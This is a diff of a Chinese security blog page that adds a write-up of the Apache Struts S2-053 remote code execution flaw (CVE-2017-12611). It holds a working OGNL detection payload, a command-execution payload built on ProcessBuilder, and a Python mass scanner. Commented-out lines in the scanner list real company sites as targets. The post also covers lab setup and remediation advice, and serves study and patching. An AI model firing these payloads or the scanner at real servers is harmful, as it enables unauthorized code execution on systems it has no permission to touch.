@@ -6,18 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://www.cmustarc.com">
-  <title>Category: notes | glamor的博客</title>
+  <title>S2-053 | glamor的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Web安全，Python">
-<meta property="og:type" content="website">
-<meta property="og:title" content="glamor的博客">
-<meta property="og:url" content="http://www.cmustarc.com/categories/notes/index.html">
+  <meta name="description" content="0x01 漏洞介绍漏洞编号:：CVE-2017-12611影响版本:：Struts 2.0.1 - Struts 2.3.33 or Struts 2.5 - Struts 2.5.10漏洞影响:  当开发人员使用Freemarker标签错误的进行构造的时候可能会造成RCE攻击">
+<meta name="keywords" content="poc,struts">
+<meta property="og:type" content="article">
+<meta property="og:title" content="S2-053">
+<meta property="og:url" content="http://www.cmustarc.com/2017/09/15/s2-053/index.html">
 <meta property="og:site_name" content="glamor的博客">
-<meta property="og:description" content="Web安全，Python">
+<meta property="og:description" content="0x01 漏洞介绍漏洞编号:：CVE-2017-12611影响版本:：Struts 2.0.1 - Struts 2.3.33 or Struts 2.5 - Struts 2.5.10漏洞影响:  当开发人员使用Freemarker标签错误的进行构造的时候可能会造成RCE攻击">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6853514-f2d90bf78f4384dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6853514-d92d26062b47ec26.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/6853514-5c891d10b519f2cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2017-09-15T06:36:57.357Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="glamor的博客">
-<meta name="twitter:description" content="Web安全，Python">
+<meta name="twitter:title" content="S2-053">
+<meta name="twitter:description" content="0x01 漏洞介绍漏洞编号:：CVE-2017-12611影响版本:：Struts 2.0.1 - Struts 2.3.33 or Struts 2.5 - Struts 2.5.10漏洞影响:  当开发人员使用Freemarker标签错误的进行构造的时候可能会造成RCE攻击">
+<meta name="twitter:image" content="http://upload-images.jianshu.io/upload_images/6853514-f2d90bf78f4384dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
   
     <link rel="alternative" href="/atom.xml" title="glamor的博客" type="application/atom+xml">
   
@@ -179,336 +185,265 @@ var _hmt = _hmt || [];
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-s2-053" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      S2-053
+    </h1>
+  
+
+        
+        <a href="/2017/09/15/s2-053/" class="archive-article-date">
+  	<time datetime="2017-09-15T06:36:57.357Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-15</time>
+</a>
+        
+      </header>
     
+<!-- 目录内容 -->
+
+    <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
+          <span class="btn-bg"></span>
+          <span class="btn-text">文章导航</span>
+          </p>
+	<div id="toc-article" class="toc-article">
+	    <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
+		<strong class="toc-title">文章目录</strong>
+           <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-漏洞介绍"><span class="toc-number">1.</span> <span class="toc-text">0x01 漏洞介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-环境搭建"><span class="toc-number">2.</span> <span class="toc-text">0x02 环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-漏洞检测和利用"><span class="toc-number">3.</span> <span class="toc-text">0x03 漏洞检测和利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#通用的poc："><span class="toc-number">3.1.</span> <span class="toc-text">通用的poc：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#通用的EXP"><span class="toc-number">3.2.</span> <span class="toc-text">通用的EXP:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#附python批量漏洞检测代码："><span class="toc-number">3.3.</span> <span class="toc-text">附python批量漏洞检测代码：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-漏洞验证"><span class="toc-number">4.</span> <span class="toc-text">0x04 漏洞验证</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-漏洞修复建议"><span class="toc-number">5.</span> <span class="toc-text">0x05 漏洞修复建议</span></a></li></ol>
+         </div>
+   <script type="text/javascript">
+	function showToc(){
+		var toc_article = document.getElementById("toc-article");
+		var show_toc_btn = document.getElementById("show-toc-btn");
+		toc_article.setAttribute("style","display:block");
+		show_toc_btn.setAttribute("style","display:none");
+		};
+	function showBtn(){
+		var toc_article = document.getElementById("toc-article");
+		var show_toc_btn = document.getElementById("show-toc-btn");
+		toc_article.setAttribute("style","display:none");
+		show_toc_btn.setAttribute("style","display:block");
+		};
+   </script>
+      		
+<!-- 目录内容结束 -->
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h1><p>漏洞编号:：CVE-2017-12611<br>影响版本:：Struts 2.0.1 - Struts 2.3.33 or Struts 2.5 - Struts 2.5.10<br>漏洞影响:  当开发人员使用Freemarker标签错误的进行构造的时候可能会造成RCE攻击<br><a id="more"></a></p>
+<h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><p>这里为了方便测试，使用的是一个已经完成s2-053漏洞环境配置的docker镜像，因此测试之前需要保证本地已经安装了docker。该docker镜像是基于ubuntu·16.04进行搭建的。<br>下载docker镜像:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker pull medicean/vulapps:s_struts2_s2-053</div></pre></td></tr></table></figure></p>
+<p>启动docker镜像<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker run -d -p 8000:8080 medicean/vulapps:s_struts2_s2-053</div></pre></td></tr></table></figure></p>
+<p><strong>ps:8000端口可以根据本机端口使用情况进行修改</strong><br>浏览器访问，以确保环境搭建成功</p>
+<h1 id="0x03-漏洞检测和利用"><a href="#0x03-漏洞检测和利用" class="headerlink" title="0x03 漏洞检测和利用"></a>0x03 漏洞检测和利用</h1><h2 id="通用的poc："><a href="#通用的poc：" class="headerlink" title="通用的poc："></a>通用的poc：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">%&#123;(<span class="comment">#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):</span></div><div class="line">((<span class="comment">#container=#context['com.opensymphony.xwork2.ActionContext.container']).</span></div><div class="line">(<span class="comment">#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).</span></div><div class="line">(<span class="comment">#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).</span></div><div class="line">(<span class="comment">#context.setMemberAccess(#dm)))).</span></div><div class="line">(<span class="comment">#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-PenTestIT',3333-2222))&#125;</span></div></pre></td></tr></table></figure>
+<p>存在漏洞，服务器返回的头部中会出现自定义的这个头部</p>
+<h2 id="通用的EXP"><a href="#通用的EXP" class="headerlink" title="通用的EXP:"></a>通用的EXP:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;(<span class="comment">#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='struts2-053').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'echo',#cmd&#125;:&#123;'echo',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span></div></pre></td></tr></table></figure>
+<h2 id="附python批量漏洞检测代码："><a href="#附python批量漏洞检测代码：" class="headerlink" title="附python批量漏洞检测代码："></a>附python批量漏洞检测代码：</h2><p><em>这个代码有待改进</em><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"><span class="comment"># Author:cmustard</span></div><div class="line">import urllib2</div><div class="line">import optparse</div><div class="line">import HTMLParser</div><div class="line">import time</div><div class="line">import ssl</div><div class="line"></div><div class="line"></div><div class="line">payload = <span class="string">"%25%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%0A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%0A%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%0A%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%0A%28%23context.setMemberAccess%28%23dm%29%29%29%29.%0A%28%23context%5B%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%5D.addHeader%28%27X-PenTestIT%27%2C3333-2222%29%29%7D"</span></div><div class="line"></div><div class="line"></div><div class="line">def poc_post(url, params):</div><div class="line">    <span class="string">""</span><span class="string">"</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    :param url:</span></div><div class="line"><span class="string">    :param params:</span></div><div class="line"><span class="string">    :return: 漏洞检测结果</span></div><div class="line"><span class="string">    "</span><span class="string">""</span></div><div class="line">    data = <span class="string">""</span></div><div class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> params:</div><div class="line">        <span class="keyword">if</span> params[key] is None:</div><div class="line">            params[key] = <span class="string">""</span></div><div class="line">        data += key +<span class="string">"="</span>+params[key] + <span class="string">"&amp;"</span></div><div class="line">    <span class="comment">#print data</span></div><div class="line">    html = get_html(url, data)</div><div class="line">    <span class="keyword">if</span> html:</div><div class="line">        headers = html.headers</div><div class="line">        <span class="comment"># print headers</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        headers = None</div><div class="line">    <span class="keyword">if</span> headers is None:</div><div class="line">        <span class="built_in">return</span> <span class="string">"error"</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">if</span> <span class="string">'X-PenTestIT'</span> <span class="keyword">in</span> headers and headers[<span class="string">'X-PenTestIT'</span>] == <span class="string">'1111'</span>:</div><div class="line">            <span class="built_in">return</span> True</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="built_in">return</span> False</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">class MyHtmlPaser(HTMLParser.HTMLParser):</div><div class="line">    <span class="string">"myhtmlpaser类，该类继承了 HTMLParser类"</span></div><div class="line"></div><div class="line">    def __init__(self):</div><div class="line">        HTMLParser.HTMLParser.__init__(self)</div><div class="line">        <span class="comment"># 申明一个字典存储登录属性和值</span></div><div class="line">        self.tag_result = &#123;&#125;</div><div class="line"></div><div class="line">    def handle_starttag(self, tag, attrs):</div><div class="line">        <span class="string">''</span><span class="string">'这是针对有属性name和 value的标签准备的，及就是那些所谓隐藏区域，即 hidden部分"</span></div><div class="line"><span class="string">            因为hidden部可能包含了重要的 cookie信息'</span><span class="string">''</span></div><div class="line">        <span class="keyword">if</span> tag == <span class="string">'input'</span>:  <span class="comment"># 选取tag标签为‘input’的部分</span></div><div class="line">            tag_name = None</div><div class="line">            tag_value = None</div><div class="line">            <span class="keyword">for</span> name, value <span class="keyword">in</span> attrs:</div><div class="line">                <span class="keyword">if</span> name == <span class="string">'name'</span>:</div><div class="line">                    tag_name = value</div><div class="line">                <span class="keyword">if</span> name == <span class="string">"value"</span>:</div><div class="line">                    tag_value = value</div><div class="line">                <span class="keyword">if</span> tag_name is not None:</div><div class="line">                    self.tag_result[tag_name] = value</div><div class="line">        <span class="string">''</span><span class="string">'&lt;input type="submit" name="0MKKey" value=" 连接网络"&gt;　</span></div><div class="line"><span class="string">        这个中的'</span>0MKKEY=连接网络 <span class="string">'，在链接网络的时候会跟用户名一起发送给目标网站</span></div><div class="line"><span class="string">        '</span><span class="string">''</span></div><div class="line"></div><div class="line"></div><div class="line">def get_html(url, data=None):</div><div class="line">    <span class="string">""</span><span class="string">"</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    :param url:</span></div><div class="line"><span class="string">    :param data:</span></div><div class="line"><span class="string">    :return: html instance</span></div><div class="line"><span class="string">    "</span><span class="string">""</span></div><div class="line">    context = ssl._create_unverified_context()</div><div class="line">    try:</div><div class="line">        <span class="keyword">if</span> data is None:</div><div class="line">            request = urllib2.Request(url)</div><div class="line"></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            request = urllib2.Request(url, data=data)</div><div class="line">        request.add_header(<span class="string">"User-Agent"</span>,</div><div class="line">                           <span class="string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/55.0.2883.87 Chrome/55.0.2883.87 Safari/537.36"</span>)</div><div class="line">        request.add_header(<span class="string">"Refer"</span>, url)</div><div class="line">        html = urllib2.urlopen(request, timeout=1, context=context)</div><div class="line">    except urllib2.HTTPError as e:</div><div class="line">        <span class="built_in">print</span> u<span class="string">"[###] 连接出现错误:&#123;&#125;"</span>.format(e.code)</div><div class="line">        <span class="built_in">return</span> False</div><div class="line">    except Exception as e:</div><div class="line">        <span class="comment">#print u"[###] 连接出现错误:&#123;&#125;，可能不存在s2-053漏洞\n".format(e)</span></div><div class="line">        <span class="built_in">return</span> False</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="built_in">return</span> html</div><div class="line"></div><div class="line"></div><div class="line">def main():</div><div class="line">    usage = <span class="string">"./s2-053.py -f filename"</span></div><div class="line">    parser = optparse.OptionParser(usage)</div><div class="line">    parser.add_option(<span class="string">'-f'</span>, <span class="string">'--filename'</span>, action=<span class="string">"store"</span>, dest=<span class="string">"filename"</span>, <span class="built_in">type</span>=<span class="string">"string"</span>, <span class="built_in">help</span>=<span class="string">"包含url的文件名"</span>)</div><div class="line">    options, args = parser.parse_args()</div><div class="line"></div><div class="line">    filename = options.filename</div><div class="line">    <span class="keyword">if</span> filename:</div><div class="line">        <span class="built_in">print</span> usage</div><div class="line"></div><div class="line">    with open(filename, <span class="string">'r'</span>) as f:</div><div class="line">        urls = f.readlines()</div><div class="line">    <span class="comment">#urls = ['https://www.airfrance.fr/CN/en/local/home/home/HomePageAction.do']</span></div><div class="line">    <span class="comment">#urls = ["https://www.wyndhamrewards.hu/trec/consumer/promoReg.action?promoRuleCode=SUMMER15&amp;variant=CN"]</span></div><div class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</div><div class="line">        flag = False</div><div class="line"></div><div class="line">        url = url.replace(<span class="string">"\n"</span>, <span class="string">""</span>)</div><div class="line">        <span class="comment"># url = url.split("?")[0]</span></div><div class="line">        try:</div><div class="line">            t = time.strftime(<span class="string">"%H:%M:%S"</span>, time.localtime())</div><div class="line">            <span class="built_in">print</span> u<span class="string">"[&#123;&#125;] 开始测试  &#123;&#125;"</span>.format(t, url)</div><div class="line">            html = get_html(url, data=None)</div><div class="line">            <span class="keyword">if</span> not html:</div><div class="line">                <span class="built_in">print</span> u<span class="string">"[!!!]&#123;&#125;  连接失败\n"</span>.format(url)</div><div class="line">                <span class="built_in">continue</span></div><div class="line">            <span class="built_in">print</span> u<span class="string">"[---] 测试中..."</span></div><div class="line">            content = html.read()</div><div class="line">            <span class="keyword">if</span> len(content)&lt;10:</div><div class="line">                <span class="built_in">print</span> u<span class="string">"[!!!] &#123;&#125; 不存在s2-053漏洞\n"</span>.format(url)</div><div class="line">                <span class="built_in">continue</span></div><div class="line">            myhtmlpaser = MyHtmlPaser()</div><div class="line">            myhtmlpaser.feed(content)</div><div class="line">            params = myhtmlpaser.tag_result</div><div class="line">            <span class="comment"># print params</span></div><div class="line">            <span class="keyword">if</span> not params:</div><div class="line">                <span class="built_in">print</span> u<span class="string">"[!!!] &#123;&#125; 不存在s2-053漏洞\n"</span>.format(url)</div><div class="line">                <span class="built_in">continue</span></div><div class="line">            <span class="keyword">for</span> key <span class="keyword">in</span> params.keys():</div><div class="line">                time.sleep(0.5)</div><div class="line">                params[key] = payload</div><div class="line"></div><div class="line">                result = poc_post(url, params)</div><div class="line">                <span class="keyword">if</span> result == <span class="string">'error'</span>:</div><div class="line">                    <span class="built_in">break</span></div><div class="line">                <span class="keyword">if</span> result:</div><div class="line">                    flag = True</div><div class="line">                    <span class="built_in">break</span></div><div class="line">            <span class="keyword">if</span> not flag:</div><div class="line">                <span class="built_in">print</span> u<span class="string">"[!!!] &#123;&#125; 不存在s2-053漏洞\n"</span>.format(url)</div><div class="line">                <span class="built_in">continue</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line"></div><div class="line">                with open(<span class="string">"s2-053_result.txt"</span>, <span class="string">"a"</span>) as f:</div><div class="line">                    f.write(url + <span class="string">'\n'</span>)</div><div class="line">                <span class="built_in">print</span> u<span class="string">"[***]&#123;&#125; 可能存在S2-053漏洞!!!\n"</span>.format(url)</div><div class="line">                <span class="built_in">continue</span></div><div class="line"></div><div class="line">        except Exception as e:</div><div class="line">            <span class="comment"># print u"[###] 连接错误:&#123;&#125;".format(e)</span></div><div class="line">            <span class="built_in">print</span> u<span class="string">"[!!!] &#123;&#125; 连接错误，可能不存在s2-053漏洞\n"</span>.format(url)</div><div class="line">            <span class="built_in">continue</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure></p>
+<h1 id="0x04-漏洞验证"><a href="#0x04-漏洞验证" class="headerlink" title="0x04 漏洞验证"></a>0x04 漏洞验证</h1><p>浏览器输入框中输入代码<br> <img src="http://upload-images.jianshu.io/upload_images/6853514-f2d90bf78f4384dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"><br>使用Burpsuite抓包观察数据包情况</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6853514-d92d26062b47ec26.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"><br>查看页面返回内容</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/6853514-5c891d10b519f2cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"></p>
+<p>从上图可以看出漏洞验证成功，成功执行了echo struts2-053命令，返回了我们想要的内容。</p>
+<h1 id="0x05-漏洞修复建议"><a href="#0x05-漏洞修复建议" class="headerlink" title="0x05 漏洞修复建议"></a>0x05 漏洞修复建议</h1><p>1.升级到Apache Struts2.5.12或2.3.34<br>2.Freemarker标签内容不要通过Request方式获取<br>3.使用只读属性来初始化value属性（仅限getter属性）<br>4.不要使用如下结构:<br>&lt;@s.hidden name=”redirectUri” value=redirectUri /&gt;<br>&lt;@s.hidden name=”redirectUri” value=”${redirectUri}” /&gt;</p>
+<p>参考<br><a href="http://struts.apache.org/docs/s2-053.html" target="_blank" rel="external">http://struts.apache.org/docs/s2-053.html</a><br><a href="https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-053" target="_blank" rel="external">https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-053</a><br><a href="https://mp.weixin.qq.com/s/4CiKgVn7Y-hWUKRjgECsuA" target="_blank" rel="external">https://mp.weixin.qq.com/s/4CiKgVn7Y-hWUKRjgECsuA</a></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2017" class="archive-year">2017</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/09/10/golang流程控制/" class="archive-article-date">
-  	<time datetime="2017-09-10T13:06:36.043Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-10</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/09/10/golang流程控制/">流程控制</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">go</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">poc</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">编程</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">struts</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/notes//" class="article-tag-list-link color1">notes</a>
+        			<a href="/categories/Web安全//" class="article-tag-list-link color1">Web安全</a>
         		</li>
       		
 		</ul>
 	</div>
 
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://www.cmustarc.com/2017/09/15/s2-053/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/09/05/论事件驱动与异步IO/" class="archive-article-date">
-  	<time datetime="2017-09-05T07:02:28.067Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-05</time>
-</a>
+<nav id="article-nav">
+  
+    <a href="/2017/09/28/正则表达式/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          正则表达式
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/09/10/golang流程控制/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">流程控制</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/09/05/论事件驱动与异步IO/">论事件驱动与异步IO[转]</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">事件驱动</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">异步IO</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/notes//" class="article-tag-list-link color1">notes</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
